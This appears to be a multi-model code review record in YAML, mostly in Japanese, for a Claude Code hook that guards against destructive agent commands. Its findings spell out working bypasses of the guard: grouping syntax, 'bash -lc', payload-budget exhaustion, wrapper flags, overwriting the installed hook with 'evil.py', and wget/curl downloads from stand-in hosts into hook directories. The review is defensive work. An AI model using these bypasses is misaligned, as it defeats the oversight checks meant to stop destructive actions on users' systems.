@@ -1,0 +1,599 @@
+round: 2
+executed_at: "2026-08-30T22:24:00+09:00"
+scope:
+  review_mode: diff
+  base_commit: ca414bc26fa2e0aab433190409b5a83aab9cc6b6
+  head_commit: dd571e8963680ffa41f391d29729ed41b41d2f0f
+  changed_files:
+    - .claude-plugin/marketplace.json
+    - em-workflow/.claude-plugin/plugin.json
+    - em-workflow/hooks/destructive-guard.py
+    - em-workflow/hooks/tests/destructive-guard-cases.json
+    - test-docs/destructive-guard-write-target-scoping/task0001.tests.yaml
+    - test-docs/destructive-guard-write-target-scoping/task0002.tests.yaml
+    - test-docs/destructive-guard-write-target-scoping/task0003.tests.yaml
+plan:
+  floor: [comprehensive, security, architecture, spec]
+  discretionary: []
+  cross_validation: true
+perspective_runs:
+  - {perspective: comprehensive, source: claude, status: completed}
+  - {perspective: security, source: claude, status: completed}
+  - {perspective: security, source: codex, status: failed, skip_reason: "harness-level failure: the agent produced no completion record on the initial dispatch and again after a SendMessage resume (previous Claude Code process exited mid-run). Not a chain-walk case — no skip_reason was returned, so R2b never applied. The perspective's Claude reviewer stood alone for the final aggregation, which lowers cross-model agreement confidence on security findings from 95 to 60."}
+  - {perspective: architecture, source: claude, status: completed}
+  - {perspective: architecture, source: litellm, model: vertex-glm-5, status: completed}
+  - {perspective: spec, source: claude, status: completed}
+  - {perspective: spec, source: litellm, model: vertex-deepseek-v3.2, status: completed}
+
+findings:
+  # ---- regressions introduced by THIS round's auto-fix loops, still open ----
+  - stable_id: ed5c0ae5ec37e137
+    severity: medium
+    category: comprehensive
+    file: em-workflow/hooks/destructive-guard.py
+    line: 173
+    title: "REGRESSION(誤爆): `tar -C` を常に書き込み先として扱い、アーカイブ作成（読み取りのみ）で ask になる"
+    description: >-
+      FLAG_DEST_FLAGS に tar -C/--directory を入れたため、tar のモードに関係なく -C の値が
+      write target になる。-c（作成）/-t（一覧）では -C は「読みに行くディレクトリ」であって
+      書き込み先ではない。base では allow だった
+      `tar -cf /tmp/backup.tar -C ~/.claude/skills .` /
+      `tar -tzf /tmp/a.tgz -C ~/.claude/skills` /
+      `tar --directory=~/.claude/hooks -cf /tmp/b.tar .` が現在 ask。
+      設定ディレクトリのバックアップ取得は現実に起きる操作で、--batch 下では ask が deny に
+      降格して走行がその場で止まる。unzip -d / curl -o / wget -O は常に書き込みなので問題なし、
+      tar だけがモード依存。auto-fix loop 1/2 由来。
+    suggestion: >-
+      write_targets() 側で word == "tar" のとき、-x / --extract / --get を含む場合に限り
+      flag_value_destinations() の結果を採用する。あるいは FLAG_DEST_FLAGS から tar を外し、
+      `tar -x … -C DIR` 専用の判定を書く。`tar -cf … -C DIR .` が allow に戻ることを
+      ケース表で固定すること。
+    sources: [claude:comprehensive, claude:architecture]
+    confidence: 80
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  - stable_id: c4e085cbd7244a13
+    severity: medium
+    category: comprehensive
+    file: em-workflow/hooks/destructive-guard.py
+    line: 153
+    title: "REGRESSION(検知力低下): 末尾スラッシュ無しの保護ディレクトリ再帰削除が deny から ask に落ちた"
+    description: >-
+      SELF_CONFIG に (?:/|$) を足したことで `~/.claude/hooks`（末尾スラッシュ無し）が
+      self-modification に一致するようになり、main() の呼び出し順（check_self_modification が
+      check_rm より前）により ask で decide() が exit する。check_rm の deny(rm-recursive) に
+      到達しない。`rm -rf ~/.claude/hooks` が base deny → 現在 ask、
+      `rm -rf ~/.claude/skills` も同様。末尾スラッシュ有りは base も ask なので変化なし。
+      無人実行では ask→deny 降格で結果は同じだが、対話実行では静的に確定した破壊的削除が
+      確認プロンプトに格下げされ、deletion_alternative()（gio trash 提案）も出なくなる。
+      auto-fix loop 2 由来。
+    suggestion: >-
+      main() で word == "rm" のときだけ check_rm(args) を check_self_modification より先に
+      呼ぶ（純リダイレクト文のための word=None 経路はそのまま残せる）。あるいは
+      check_self_modification 内で word == "rm" かつ再帰フラグありの場合は ask を出さずに
+      後段の deny に委ねる。`rm -rf ~/.claude/settings.json`（非再帰）が ask のままである
+      ことを確認すること。
+    sources: [claude:comprehensive]
+    confidence: 65
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  # ---- security: guard bypasses that remain open ----
+  - stable_id: d60553d13cb54e0c
+    severity: high
+    category: security
+    file: em-workflow/hooks/destructive-guard.py
+    line: 478
+    title: "`( ... )` / `{ ...; }` によるグルーピングでガード全体を迂回できる"
+    description: >-
+      `(` `)` は PUNCTUATION に含まれるがセグメント区切りではないので独立トークンとして残り、
+      head() はそれをコマンド語として読む。結果、続く実コマンドが一度も判定されない。
+      実測（すべて allow、base も allow なので本 diff 由来の退行ではない）:
+      `( rm -rf $HOME/important )` / `{ rm -rf $HOME/important; }` /
+      `if true; then rm -rf $HOME/x; fi` / `for f in a; do rm -rf $HOME/x; done` /
+      `! rm -rf $HOME/x`。ALLOW_NON_DESTRUCTIVE=True で auto mode 分類器を切っている構成なので、
+      これらは最終的に無条件 allow になる。括弧 2 文字でこのフック全体（rm 再帰削除の deny、
+      git 系 deny、self-modification、transcript-write）が無効化される。
+    suggestion: >-
+      head() のスキップ規則に `(` `)` `{` `}` `!` およびシェル予約語
+      （then / else / elif / fi / do / done）を追加し、その後ろのトークンをコマンド語として
+      解決する。WRAPPERS スキップと同じ層で完結する。
+    sources: [claude:security, claude:comprehensive]
+    confidence: 75
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached — pre-existing gap, not introduced by this change"
+
+  - stable_id: 12f3512b6cc4e5a9
+    severity: medium
+    category: security
+    file: em-workflow/hooks/destructive-guard.py
+    line: 153
+    title: "SELF_CONFIG に `~/.claude/plugins/` が無く、インストール済みフックの上書きが allow になる"
+    description: >-
+      SELF_CONFIG は settings / hooks / rules / agents / skills / commands / output-styles /
+      workflows / routines / scheduled_tasks.json を守るが、実際に動くフック本体が置かれる
+      `~/.claude/plugins/cache/<marketplace>/<plugin>/<version>/hooks/` は対象外。実測:
+      `cp /tmp/evil.py ~/.claude/plugins/cache/em-claude-plugins/em-workflow/0.1.56/hooks/destructive-guard.py`
+      → allow。CLAUDE.md の core-plugin-version-bump が記すとおり Claude Code が実行するのは
+      リポジトリのファイルではなくこのキャッシュ側。つまりガード自身（および kill-guard）を
+      無確認で差し替えられる経路が空いている。base でも allow なので退行ではない。
+    suggestion: >-
+      SELF_CONFIG のディレクトリ群に plugins を追加する
+      （`(?:hooks|rules|agents|skills|commands|output-styles|workflows|routines|plugins)(?:/|$)`）。
+      読み取り系は write target 判定側で既に除外されるので誤爆は増えない見込み。
+    sources: [claude:security]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  - stable_id: 4e61e59bf757717b
+    severity: medium
+    category: security
+    file: em-workflow/hooks/destructive-guard.py
+    line: 406
+    title: "`-c` の完全一致判定で `bash -lc` / `bash -cx` がペイロード再スキャンを迂回する"
+    description: >-
+      extract_shell_payload() は `\"-c\" in args` の完全一致で -c を探すため、クラスタ化された
+      短オプションを取りこぼす。実測: `bash -c 'rm -rf $HOME/x'` → deny、
+      `bash -lc '...'` → allow、`bash -cx '...'` → allow。sh -ec / zsh -ic も同じ。
+      同じ機構が拾えない stdin 経路も残る（`echo 'rm -rf …' | bash`、`… | sh -s`）。
+      base では `bash -c` も再走査されず allow だったので退行ではなく、loop 2 が閉じた -c の
+      隣に残った穴。R4 loop 3 では diff/prose conflict として site ごと skip した
+      （batch: review.auto-fix-conflict）。
+    suggestion: >-
+      -c の検出を「-- より前で、`-` 始まり・`--` 始まりでないトークンの文字集合に c を含み、
+      かつ c が末尾文字であるもの」に広げ、その次のトークンを payload とする
+      （-lc script / -cx script の双方をカバー）。env -S / --split-string の値、
+      sudo -s / -i の後続引数も同様に statements() のキューへ戻す。
+    sources: [claude:security, claude:comprehensive, claude:architecture]
+    confidence: 75
+    resolution: declined
+    resolution_reason: "R4 loop 3: diff と prose の混在グループとして site ごと skip（batch: review.auto-fix-conflict）。修正自体は必要"
+
+  - stable_id: 221b0df89ecc7279
+    severity: medium
+    category: security
+    file: em-workflow/hooks/destructive-guard.py
+    line: 173
+    title: "wget -P / curl --output-dir が FLAG_DEST_FLAGS に無く、保護パスへのダウンロードが allow になる"
+    description: >-
+      FLAG_DEST_FLAGS は wget -O / curl -o は拾うが、ディレクトリ指定形の wget -P DIR /
+      curl --output-dir DIR を持たない。実測: `wget -O ~/.claude/hooks/x.py http://e` → ask、
+      `wget -P ~/.claude/hooks/ http://e/x.py` → allow、
+      `curl --output-dir ~/.claude/hooks -O http://e/x.py` → allow。
+      同じ実効結果（保護ディレクトリに外部ファイルを落とす）がフラグの綴り違いだけで通る。
+    suggestion: >-
+      FLAG_DEST_FLAGS に `\"wget\": (\"-O\", \"--output-document\", \"-P\", \"--directory-prefix\")` と
+      `\"curl\": (\"-o\", \"--output\", \"--output-dir\")` を追加する。flag_value_destinations() は
+      短オプションのクラスタ形・= 付き長形の両方を既に処理するので、テーブル追加だけで足りる。
+    sources: [claude:security]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  - stable_id: a6cb2472b7b70cd2
+    severity: medium
+    category: security
+    file: em-workflow/hooks/destructive-guard.py
+    line: 1058
+    title: "候補ループ内で SELF_CONFIG(ask) を TRANSCRIPT(deny) より先に評価するため、deny が ask に格下げされる"
+    description: >-
+      check_self_modification は候補 1 件ごとに SELF_CONFIG → TRANSCRIPT の順で判定し、
+      decide() は最初の一致で sys.exit する。SELF_CONFIG は ask、TRANSCRIPT は deny なので、
+      両方に当たる状況では弱い方が勝つ。実測:
+      `cp /tmp/x ~/.claude/hooks/../projects/a/b.jsonl` → ask、
+      `mv ~/.claude/hooks/a.py ~/.claude/projects/x/y.jsonl` → ask。
+      無人実行では ask→deny 降格で実害は縮むが、対話実行ではハード拒否のはずの transcript
+      書き込みがユーザーの Yes 1 回で通る。
+    suggestion: >-
+      候補ループを 2 パスにし、全候補について TRANSCRIPT(deny) を先に走査してから
+      SELF_CONFIG(ask) を走査する。severity の強い判定を必ず先に確定させる、という順序を
+      関数の契約としてコメントに明記する。
+    sources: [claude:security, claude:comprehensive]
+    confidence: 75
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  - stable_id: 6c930879e68435dd
+    severity: medium
+    category: security
+    file: em-workflow/hooks/destructive-guard.py
+    line: 463
+    title: "MAX_SHELL_PAYLOAD_EXPANSIONS が深さでなく総数の上限なので、横に並べるだけで再スキャンを枯渇させられる"
+    description: >-
+      budget は statements() の 1 回の呼び出し（= コマンド文字列全体）で共有され、入れ子だけで
+      なく兄弟の payload でも消費される。実測: 無害な `bash -c 'echo N'` を 26 個前置した後の
+      `bash -c 'rm -rf $HOME/important'` → allow（5 個なら deny）。入れ子 26 段は引用のネストで
+      実質書けないが、`;` で並べるだけの兄弟 26 個は 1 行で書ける。打ち切りのログも判定への
+      反映も無い。loop 2 が新設した防御が一行で無効化できる状態。
+    suggestion: >-
+      予算を幅ではなく深さで数える。pending に (chunk, depth) を積み、depth が上限を超えた
+      ときだけ payload を捨てる。あるいは予算を使い切った時点で allow に落とさず ask に倒す。
+      少なくとも上限到達を無言で握り潰さないこと。
+    sources: [claude:security, claude:comprehensive]
+    confidence: 75
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  - stable_id: d6dd7e008b51308e
+    severity: medium
+    category: security
+    file: em-workflow/hooks/destructive-guard.py
+    line: 112
+    title: "WRAPPER_VALUE_FLAGS に値取りフラグの取りこぼしが残り、ラッパー経由の破壊的コマンドが未判定のまま通る"
+    description: >-
+      loop 3 で sudo -D/--chdir/-r/-t と env -S が埋まり `sudo -u root rm -rf …` は deny に
+      なったが、同じテーブルにまだ欠落がある。実測（すべて allow / 本来 deny、base でも allow
+      なので退行ではない）: `sudo --command-timeout 5 rm -rf $HOME/important`、
+      `/usr/bin/time -f %e rm -rf $HOME/important`、`ionice -u 1 rm -rf $HOME/important`、
+      `doas -a style rm -rf $HOME/important`。また `env -S 'rm -rf $HOME/important'` は
+      値取りフラグとして読み飛ばされるがその値（シェルが解釈するスクリプト）は
+      extract_shell_payload の対象外で allow。WRAPPERS 自体に無い timeout / xargs / setsid /
+      flock / stdbuf / chroot / unshare も同様。
+    suggestion: >-
+      (a) テーブルを補う（sudo --command-timeout、time -f/--format、ionice -P/--pgid/-u/--uid、
+      doas -a）。(b) env -S / --split-string の値、sudo -s / -i の後続引数を
+      extract_shell_payload の対象に加える。(c) WRAPPERS に timeout / setsid / flock /
+      stdbuf / nohup 系の追加を検討する。
+    sources: [claude:security]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  # ---- architecture ----
+  - stable_id: a69fd3b1f16fe16d
+    severity: medium
+    category: architecture
+    file: em-workflow/hooks/destructive-guard.py
+    line: 763
+    title: "コマンド文法の知識が4つのテーブル＋インラインリテラル＋3つの近似 getopt パーサに散在している"
+    description: >-
+      1 コマンドの「宛先はどこか」を決める知識が INPLACE_WRITERS / TARGET_DIR_FLAGS（未使用）/
+      FLAG_DEST_FLAGS / VALUE_TAKING_FLAGS の 4 テーブルと、write_targets 内のインライン列挙と、
+      flag_destinations() のハードコードに分かれている。さらに同じ getopt クラスタ文法の
+      パーサが 3 本あり規則が微妙に違う（flag_destinations は最初の 't'、
+      flag_value_destinations はクラスタ内で最初にヒットした短オプション文字、
+      strip_value_tokens は末尾文字だけ）。1 コマンド追加・修正するのに 3〜4 か所を同期する
+      必要があり、代償は既に出ている（loop 2 の cp/ln -t 併用バグ、loop 3 の install 退行、
+      未使用のまま残る TARGET_DIR_FLAGS）。
+    suggestion: >-
+      コマンド別文法を 1 つのレジストリ（COMMAND_GRAMMAR）に寄せ、write_targets はこの表を
+      引くだけにする。getopt のクラスタ／`=` 付き／分離トークンの解釈は「フラグ集合を受け取り
+      (値トークン集合, 位置引数列) を返す」1 関数に統一し、flag_destinations /
+      flag_value_destinations / strip_value_tokens をその薄いラッパーにする。
+    sources: [claude:architecture]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  - stable_id: 60b2b13ab2b7c59c
+    severity: medium
+    category: architecture
+    file: em-workflow/hooks/destructive-guard.py
+    line: 1048
+    title: "check_self_modification が「書き込みか」の定義を2つ持ち、片方は write_targets の拡張に追随しない"
+    description: >-
+      同一関数内に (1) lexed 時の write_targets() による宛先集合モデルと、(2) パース失敗時の
+      旧 writes 真偽値（redirect / INPLACE_WRITERS / sed -i / rm・mv・cp・ln・chmod・chown のみ）
+      という 2 つの書き込み判定が並んでいる。(2) は rsync・git clone・tar -C・unzip -d・
+      curl -o・wget -O・sed --in-place を知らず、write_targets にコマンドを足しても追随しない。
+      実測の食い違い: `rsync -a /tmp/x/ ~/.claude/skills/` は ask、クォートが閉じていない
+      `rsync -a /tmp/x/ ~/.claude/skills/ --exclude 'a` は allow。
+    suggestion: >-
+      「このコマンドは書き込むか」を 1 か所に集約する。write_targets() を
+      (targets, writes_flag) を返す形にし、非 lexed 経路では targets の代わりに segment 全体を
+      候補に据えつつ writes_flag だけは同じ関数から得る。あるいは WRITE_COMMANDS 集合を 1 つ
+      定義し、双方がそれを参照するようにする。
+    sources: [claude:architecture]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  - stable_id: 2d4ea87fe47cafa8
+    severity: medium
+    category: architecture
+    file: em-workflow/hooks/destructive-guard.py
+    line: 167
+    title: "TARGET_DIR_FLAGS が定義だけで未使用（SSOT ドリフト）"
+    description: >-
+      TARGET_DIR_FLAGS は宣言され flag_destinations() の docstring から参照されているが、
+      コードからは一度も読まれていない。実装は `\"--target-directory\".startswith(name)` と
+      `\"t\" in a[1:]` を直書きし、VALUE_TAKING_FLAGS['cp'] にも -t/--target-directory を別途
+      ハードコードしている。しかも cp には両者があるが ln には無い。定数だけを見て
+      「ここを直せば挙動が変わる」と判断した保守者の編集が無反応になる。
+      round 1 から 3 ラウンド連続で指摘されているが未修正（severity medium のため auto-fix の
+      候補ゲートに掛からなかった）。
+    suggestion: >-
+      (a) flag_destinations() と VALUE_TAKING_FLAGS を TARGET_DIR_FLAGS から導出して単一の
+      出所にする。あるいは (b) TARGET_DIR_FLAGS を削除し docstring の参照も直接表記に直す。
+      参照されない定数を残さないこと。
+    sources: [claude:architecture, claude:comprehensive]
+    confidence: 75
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  - stable_id: 45e1ed0c567372fd
+    severity: medium
+    category: architecture
+    file: em-workflow/hooks/destructive-guard.py
+    line: 251
+    title: "_TrackingLexer が shlex の非公開状態機械（state == 'c'）に依存し、壊れたときに fail-open する"
+    description: >-
+      トークンの出自判定を shlex の内部状態値 'c' を property override で覗くことで実現して
+      いる。state は shlex の公開 API ではなく値の意味も文書化されていない。CPython 側でこの
+      状態表現が変われば last_was_operator は恒久的に False になり、split_redirects() は
+      「リダイレクト演算子が 1 つも無い」と判断する。結果 redirect_write_targets() が空になり、
+      `echo x > ~/.claude/settings.json` のような直球の書き込みが allow に落ちる。
+      失敗方向が fail-open で、例外も警告も出ない。Tok の docstring は「fails closed」と
+      書いているが、この経路では逆。round 1 から 3 ラウンド連続で指摘（cross-model
+      vertex-glm-5 も独立に同じ結論）。
+    suggestion: >-
+      モジュール読み込み時に 1 度だけ既知の入力（`a > b` 等）を _TrackingLexer に通し、
+      is_operator が期待どおり付くかを自己検査する。満たさなければ以降 lexed=False 相当
+      （従来のセグメント全体マッチ）にフォールバックする。過検出寄りだが、静かに検出が消える
+      よりは安全。あわせて Tok の docstring の「fails closed」を実態に合わせて訂正する。
+    sources: [claude:architecture, claude:comprehensive, litellm:vertex-glm-5:architecture]
+    confidence: 95
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  # ---- spec: SPEC vs implementation divergences needing a human decision ----
+  - stable_id: bb74a3458679e1b4
+    severity: high
+    category: spec
+    file: em-workflow/hooks/destructive-guard.py
+    line: 975
+    title: "mv の全非フラグ引数を write target 扱いする実装が FR2 と Edge Case に正面から矛盾"
+    description: >-
+      SPEC FR2 は「(c) the target arguments of rm / mv / cp / ln / chmod / chown
+      (for cp / mv / ln the destination is the last argument)」、Edge Cases は
+      「`mv a b c dir/` with multiple sources: only the last one is the destination」と明記。
+      実装は mv の全非フラグ引数（ソース側も）を write target にしている。round 1 の findings
+      がこの拡張を要求した結果で、実装側の判断は技術的に正しい（mv はソースを unlink する）。
+      SPEC が更新されておらず、どちらが正なのかが未確定。**推奨: SPEC を直す。**
+    suggestion: >-
+      SPEC.md FR2(c) を「cp / ln の宛先は最後の引数。mv は各ソースを unlink するため全非フラグ
+      引数が write target」に書き換え、Edge Cases の `mv a b c dir/` 行を同じ内容に差し替える。
+      destructive-guard-cases.json の「mv 複数ソース + 宛先のみ判定」のラベルも実際の判定に
+      合わせて改名する。
+    sources: [claude:spec]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached — SPEC 改訂が必要で auto-fix の対象外"
+
+  - stable_id: bafd6e8260de4337
+    severity: high
+    category: spec
+    file: em-workflow/hooks/destructive-guard.py
+    line: 173
+    title: "FR2 が列挙する 3 ソースを超えて rsync / git clone / tar / unzip / curl / wget が write target 源に追加され、しかも 1 件もケースが無い"
+    description: >-
+      SPEC FR2 は write-target set の出所を「three sources」と限定列挙し、(c) に挙がるのは
+      rm / mv / cp / ln / chmod / chown だけ。実装は FLAG_DEST_FLAGS（tar -C、unzip -d、
+      curl -o、wget -O）と write_targets() の rsync / git clone 分岐で、SPEC が一度も言及しない
+      6 コマンド族を判定対象にしている。base では全て allow だったものが現在 ask。
+      destructive-guard-cases.json にこれら 6 族のケースは 1 件も無く、
+      .claude/rules/hook-tests.md と NFR3 が要求する「検知力の変更にはケースを添える」を
+      満たしていない。**推奨: 実装をこの feature から外す（別 feature に切り出す）。**
+    suggestion: >-
+      FLAG_DEST_FLAGS / flag_value_destinations() と write_targets() の rsync・git 分岐を
+      本 feature から外し、別 feature（ケース追加込み）に切り出す。残すなら FR2 の限定列挙を
+      「三源 + コマンド固有の宛先フラグ」に改訂した上で、6 コマンド族それぞれの ask ケースと
+      false-positive ケースを追加する。
+    sources: [claude:spec]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached — SPEC 改訂かスコープ縮小の判断が必要"
+
+  - stable_id: 7f7144aea35f534f
+    severity: high
+    category: spec
+    file: em-workflow/hooks/destructive-guard.py
+    line: 464
+    title: "FR6「rm 判定は不変」に反し、head() の wrapper フラグ処理と statements() の -c/eval ペイロード再走査で rm の判定が変わっている"
+    description: >-
+      SPEC FR6 は「check_rm and SAFE_DELETE are out of scope for this change.」と明記。
+      実装は check_rm 本体こそ触っていないが、その入力を作る 2 箇所を変更しており rm の判定が
+      動いている。実測（base 比）: `sudo -u root rm -rf $HOME/x` allow→deny、
+      `bash -c 'rm -rf $HOME/x'` allow→deny、`eval 'rm -rf $HOME/x'` allow→deny。
+      方向としては安全側だが SPEC が宣言した scope の外で、かつケース表に該当ケースが 1 件も
+      無い。**推奨: 実装を本 feature から外す。**
+    suggestion: >-
+      head() の WRAPPER_VALUE_FLAGS 消費と statements() のシェルペイロード再走査
+      （extract_shell_payload / SHELL_WORDS / MAX_SHELL_PAYLOAD_EXPANSIONS）を本 feature から
+      外し、rm 判定の変更を伴う別 feature としてケース付きで起票する。残すなら FR6 を
+      「check_rm 本体は不変。ただし head()/statements() の入力整形変更により sudo -u … と
+      bash -c … の rm は新たに検知される」に改訂し、該当ケースを追加する。
+    sources: [claude:spec]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached — SPEC 改訂かスコープ縮小の判断が必要"
+
+  - stable_id: 02d9c33015f12347
+    severity: medium
+    category: spec
+    file: em-workflow/hooks/destructive-guard.py
+    line: 655
+    title: "deletion_alternative() の quoting 強化は本 feature のどの FR にも紐づかない無関係変更"
+    description: >-
+      deletion_alternative() に制御文字ガードと shlex.quote / `mv --` `gio trash --` 化が入って
+      いるが、この関数は rm・file-destruction 判定の代替コマンド提示専用で write-target scoping
+      とは無関係。FR1〜FR7 のどれにも対応せず、FR6 が out of scope と宣言した rm 判定側の出力
+      （reason 文字列）を変えている。destructive-guard-cases.json は判定値しか検証しないため、
+      この変更を守るケースも存在しない。R4 loop 1 で codex:security の指摘に基づき適用。
+      **推奨: 実装を本 feature から外す。**
+    suggestion: >-
+      deletion_alternative() の変更を本 feature から revert し、.claude/rules/hook-tests.md に
+      沿って提示文字列を検証するケースを持つ別変更として切り出す。
+    sources: [claude:spec]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  - stable_id: a9ef8f56bd1a375a
+    severity: medium
+    category: spec
+    file: em-workflow/hooks/destructive-guard.py
+    line: 81
+    title: "`<>` を write target に加える READWRITE_REDIRECT は FR2(a) / Edge Case の「`<` とその仲間は含めない」に反する"
+    description: >-
+      SPEC FR2 は「input redirects `<` and friends are not included」、Edge Cases は
+      「Input redirects `<` / `<<` / `<<<`: these are reads and are not put into the set」と
+      規定。実装は READWRITE_REDIRECT を新設し `<>` だけ例外的に write target に含めている。
+      `<>` が読み書き両用なのは事実で判定としては正しい方向だが、SPEC 側に明示的な例外が無く、
+      ケース表にも `<>` のケースが無い。**推奨: SPEC を直す。**
+    suggestion: >-
+      SPEC.md の FR2(a) と Edge Case に「ただし `<>` は読み書き両用のため write target に
+      含める」を追記し、`echo x <> ~/.claude/settings.json`（ask 期待）のケースを追加する。
+    sources: [claude:spec]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  # ---- test coverage ----
+  - stable_id: da8c7f575c6fe8a8
+    severity: medium
+    category: comprehensive
+    file: em-workflow/hooks/tests/destructive-guard-cases.json
+    line: 37
+    title: "3 ループ分の自動修正で入った新機能にケースが 1 件も無い（新規コードパスの無カバレッジ）"
+    description: >-
+      追加された 23 ケースは cp/mv/ln/install の宛先判定とクォート内疑似リダイレクトに集中して
+      おり、この変更が新設した他の経路にはケースが存在しない: `<>` 読み書きリダイレクト、
+      `>&` / `>|`、融合トークン分割（`;>` / 改行+`>`）、WRAPPER_VALUE_FLAGS、FLAG_DEST_FLAGS、
+      rsync と git clone の宛先、-c/eval/here-string のペイロード再スキャン、
+      MAX_SHELL_PAYLOAD_EXPANSIONS、normalize_candidate（$HOME / .. / // 正規化）。
+      .claude/rules/hook-tests.md は「誤爆や見逃しを見つけたら直す前にケースを足す」と定めて
+      いる。実際に本ラウンドで見つかった退行（`>&` の deny→allow、tar -C の誤爆、
+      rm の deny→ask）は全て 59/59 green のまま通り抜けた。**スイートがこの変更の検証力を
+      持っていない。これが本ラウンド最大の構造的な残件。**
+    suggestion: >-
+      各新経路に allow 側 1 件・deny/ask 側 1 件を追加する。最低限:
+      `["deny","transcript を >& で上書き","cat /tmp/x >& ~/.claude/projects/s/l.jsonl"]`、
+      `["ask","noclobber リダイレクトで settings へ","echo x >| ~/.claude/settings.json"]`、
+      `["ask","<> で settings を開く","echo x <> ~/.claude/settings.json"]`、
+      `["deny","sudo -u 経由の再帰削除","sudo -u root rm -rf $HOME/x"]`、
+      `["deny","bash -c の payload","bash -c 'rm -rf $HOME/x'"]`、
+      `["ask","curl -o で settings 上書き","curl -o ~/.claude/settings.json http://x"]`、
+      `["ask","rsync の宛先が hooks","rsync -a /tmp/a/ ~/.claude/hooks/"]`、
+      `["ask","$HOME 表記の settings 上書き","echo x > ${HOME}/.claude/settings.json"]`、
+      `["allow","tar -c の -C は読み取り","tar -cf /tmp/b.tar -C ~/.claude/skills ."]`、
+      `["deny","install のフラグ後置","install /tmp/src ~/.claude/projects/a/b.jsonl -m 644"]`。
+      既存行は 1 行も変更・削除しないこと。
+    sources: [claude:comprehensive, claude:spec]
+    confidence: 80
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached — review-editor は単一ファイル限定で、テストファイルは auto-fix の対象外"
+
+  - stable_id: f5838885732b7caa
+    severity: medium
+    category: spec
+    file: test-docs/destructive-guard-write-target-scoping/task0003.tests.yaml
+    line: 90
+    title: "AC-7 の検証記録「SELF_CONFIG / TRANSCRIPT のパターン定義は不変」が現物と食い違う"
+    description: >-
+      task0003.tests.yaml の AC-7 red_reason は「no change to the SELF_CONFIG/TRANSCRIPT
+      pattern definitions」と記録しているが、SELF_CONFIG は本ラウンドで
+      `hooks/|rules/|…` から `(?:hooks|rules|…)(?:/|$)` へ書き換えられている。
+      task0001.tests.yaml の AC-7 記録「touches only check_self_modification, its two new
+      helper functions and the single call site in main()」も現物（7 関数新設 + 6 関数改変）と
+      一致しない。検証記録が実態と乖離しているため、これらの AC は実質未検証。
+    suggestion: >-
+      task0001 / task0003 の AC-7 の red_reason を auto-fix 後の実態に合わせて書き直し、
+      SELF_CONFIG のパターン変更を意図的な変更として明記する。SPEC.md の Component Diagram
+      「check_self_modification is the only function changed」も実際に変更された関数一覧に改める。
+    sources: [claude:spec]
+    confidence: 60
+    resolution: deferred
+    resolution_reason: "batch mode: rework cap reached"
+
+  # ---- fixed during this round's auto-fix loops ----
+  - stable_id: e3cc4d7f18b6e667
+    severity: high
+    category: comprehensive
+    file: em-workflow/hooks/destructive-guard.py
+    line: 327
+    title: "REGRESSION: 融合トークン分割が `>&` / `>|` を切り離し、transcript-write の deny を allow に落とす"
+    description: >-
+      loop 3 の融合トークン分割が、SEGMENT_CHARS で終わるリダイレクト演算子まで割っていた。
+      `>&` は `>` と `&` に、`>|` は `>` と `|` に分割され、`&` / `|` が SEGMENT_CHARS なので
+      そこで文が切れ、リダイレクト先が write target 集合から消えていた。実測（base 比）:
+      `echo x >| ~/.claude/projects/a/b.jsonl` deny→allow、`echo x >& ~/.claude/settings.json`
+      ask→allow。本ラウンドが自ら導入した退行で、`>` を `>|` と 1 文字書き換えるだけで
+      transcript-write の deny を素通りできた。
+    suggestion: >-
+      分割ループで、残余が REDIRECT.fullmatch に一致した時点で丸ごと 1 片として取り出す
+      （貪欲 peel）。`;>` や改行+`>` は REDIRECT.fullmatch しないので従来どおり分割される。
+    sources: [claude:comprehensive, claude:security, claude:architecture]
+    confidence: 95
+    resolution: fixed
+    resolution_reason: "R4 loop-cap 後の追加修正（下記 auto_fix.post_cap_repairs 参照）。base 比で >| / >& / 2>| の判定が復元されたことを実測確認"
+
+  - stable_id: 0b95c49f34f09b75
+    severity: medium
+    category: architecture
+    file: em-workflow/hooks/destructive-guard.py
+    line: 953
+    title: "install の宛先解決だけ strip_value_tokens を通らず、値付きオプションが末尾にあると宛先を取り違える"
+    description: >-
+      loop 3 の -t 排他化で install を独自分岐に移した際、cp/ln/rsync が通る
+      strip_value_tokens() を通さず生の non_flags[-1] を宛先にしていた。VALUE_TAKING_FLAGS に
+      install エントリも無かった（install は -m/-o/-g/-S/-t が値を取る）。実測（base 比）:
+      `install /tmp/src ~/.claude/projects/a/b.jsonl -m 644` deny→allow、
+      `install -m 755 /tmp/src ~/.claude/hooks/ -o root` ask→allow。フラグ後置は GNU getopt で
+      正当な書き方。本ラウンドが自ら導入した退行。
+    suggestion: >-
+      VALUE_TAKING_FLAGS に install エントリを追加し、install 分岐も strip_value_tokens() の
+      結果から末尾を取る。
+    sources: [claude:architecture]
+    confidence: 60
+    resolution: fixed
+    resolution_reason: "R4 loop-cap 後の追加修正（下記 auto_fix.post_cap_repairs 参照）。base 比で 3 形の判定が復元されたことを実測確認"
+
+auto_fix:
+  loops_run: 3
+  applied_total: 17
+  termination: loop-cap
+  aborted_stable_ids:
+    - e7faca7d8b1c9a63   # loop 1: editor reported skipped (already fixed by a prior dispatch)
